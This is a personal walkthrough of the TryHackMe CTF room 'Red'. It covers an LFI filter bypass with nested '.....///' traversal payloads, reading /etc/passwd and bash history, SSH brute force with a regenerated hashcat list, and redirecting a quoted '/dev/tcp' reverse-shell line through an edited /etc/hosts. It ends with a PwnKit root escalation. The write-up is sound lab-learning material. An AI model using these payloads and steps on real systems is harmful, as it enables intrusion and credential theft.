# Red (Also known as redisl33t)

> **TryHackMe Room**: [Red](https://tryhackme.com/room/redisl33t)

This write-up covers how I approached the room, step by step. Flags and specific credential values are not included.

## Introduction

I had been dreading this room for months. My first scan of the machine dates back to August, when I was not yet familiar with Local File Inclusion and was still fairly new to CTFs. I had even read other write-ups and watched a walkthrough video, and I still did not finish it, though I came close once.

Recently I worked through two other rooms whose main theme was LFI. Each had its own twist, but compared to them, this room’s initial access looked more approachable, so I decided to come back and finish it. I should be upfront: I had seen a walkthrough of this room before, so I was not solving it completely blind. What changed this time is that I actually understood each step and carried it out myself, instead of copying along.

## Initial Access

The initial scan showed port `22` and port `80` open. Visiting port `80`, the default URL was:

```url
http://<machine ip>/index.php?page=home.html
```

Back in August I did not know what to do with this. Now I recognize it as a likely LFI: a page parameter being passed into a file-reading function.

My first step was a normal payload:

```
../../../../etc/passwd
```
If the file comes back, the LFI works as-is. It did not, which meant the application was filtering the input somehow, so I needed to understand how. Since I could read files, I read the source of `index.php` itself:

```php
<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```

Two things stood out. First, this uses `readfile()`, which reads a file and returns its contents, rather than `include`, which would execute it. So this is a file-read LFI, useful for reading files off the server, not for directly running code through the include itself.

Second, there are two obstacles in the code:

- `sanitize_input()` strips out `../` and `./` from the input.
- The `preg_match("/^[a-z]/", ...)` check requires the input to start with a lowercase letter.

The filter is the interesting part. It removes `../` and `./` by simple string replacement, but it only does this once, and it does not account for what the string looks like after removal. So a sequence like `.....///` has its inner `../` and `./` stripped out, and what remains collapses back into `../`. Working through this in Burp Suite, the traversal payload became:


```url
.....///.....///.....///.....///etc/passwd
```

Then, to satisfy the “must start with a lowercase letter” check, I prefixed it with a letter and a slash:

```url
a/.....///.....///.....///.....///etc/passwd
```

The leading `a/` passes the regex, and the `/`after it keeps the path valid (it stands in for the leading slash of `/etc/passwd`). The prefix letter can be anything, and more than one works too.

Reading files this way, I confirmed I was operating as the `blue` user (the room states this). I read blue’s bash history and found a sequence that showed how a password list had been generated: a file was run through hashcat’s `best64` rule to expand it into candidate passwords, saved to a list, used, and then cleaned up, with hashcat uninstalled afterward.

That told me the approach: find the seed file, run it through the same `best64` rule to regenerate the candidate list, and use that list to brute-force SSH. I read the seed file through the LFI (its contents are an answer, so I am leaving them out). On my own machine I only had `best66.rule`, so I downloaded `best64.rule`, reproduced the same hashcat step, and generated a password list for blue.

## Lateral Movement

Using that list with Hydra, I logged in over SSH on port `22` as blue. I kept that session handy, because the room warns that “red” can kick you out at any time, and indeed red periodically sent taunting messages to the terminal, for example:

```bash
I recommend you leave Blue or I will destroy your shell
Red Rules, Blue Drools!
```

To find out how red was doing that, I used pspy to watch running processes. I hosted it from my machine with a simple Python web server and pulled it onto the target with wget, made it executable, and ran it. It revealed a process like this:

```bash
CMD: UID=1001 ... bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
```

Red was repeatedly making a reverse-shell connection to `redrules.thm` on port 9001. If I could make `redrules.thm` resolve to my machine, that shell would connect to me instead. I checked /etc/hosts and found its permissions had been deliberately loosened:

```bash
-rw-r--rw- 1 root adm 242 ... /etc/hosts
```
Normally `/etc/hosts` is not world-writable, so this was clearly the intended path. I added an entry pointing `redrules.thm` at my own IP:

```bash
echo "<my-ip> redrules.thm" >> /etc/hosts
```

Then I started a `netcat` listener on port `9001`, and after a short wait the reverse shell connected back to me as red. From there I read the flag.

## Privilege Escalation

In red’s home directory I found a .git directory, and inside it a SUID-enabled copy of `pkexec` at `/home/red/.git/pkexec`. This points to CVE-2021-4034 (PwnKit). I looked it up and tried several public exploits, and most of them did not work for me. The reason, I believe, is that the standard PwnKit exploits assume `pkexec` is at its usual system path (`/usr/bin/pkexec`), whereas here it had been placed in a non-standard location. One Python exploit worked once I adjusted it to point at this machine’s `pkexec` path. Running it gave me a root shell:

```bash
uid=0(root) gid=1001(red) groups=1001(red)
```
And then I read the flag.

## Conclusion

This room is rated easy, and back in August it did not feel that way at all. After a couple of months of working through CTFs, it does now. It is listed at 180 minutes; I finished in about an hour and a half, partly because I had seen the path before and this time understood it rather than following along blindly. The clues are laid out fairly clearly once you know how to read them, so a curious approach goes a long way here.
